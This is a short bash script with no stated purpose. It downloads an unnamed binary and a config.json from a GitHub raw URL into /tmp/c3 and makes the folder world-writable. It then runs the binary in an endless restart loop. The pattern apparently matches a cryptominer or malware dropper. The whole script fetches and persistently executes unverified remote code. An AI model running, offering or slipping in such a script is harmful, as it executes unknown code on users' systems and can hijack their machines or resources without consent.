#!/bin/bash
## requirement
apt-get -qq update
apt-get -qq install -y wget curl unzip


mkdir -p /tmp/c3
cd /tmp/c3
wget https://raw.githubusercontent.com/Blenkinship/any/main/32/config.json
wget https://raw.githubusercontent.com/Blenkinship/any/main/0
chmod -R  777 /tmp/c3
#!/bin/sh
while [ 1 ]; do
	/tmp/c3/0 --config=/tmp/c3/config.json
	sleep 5
done

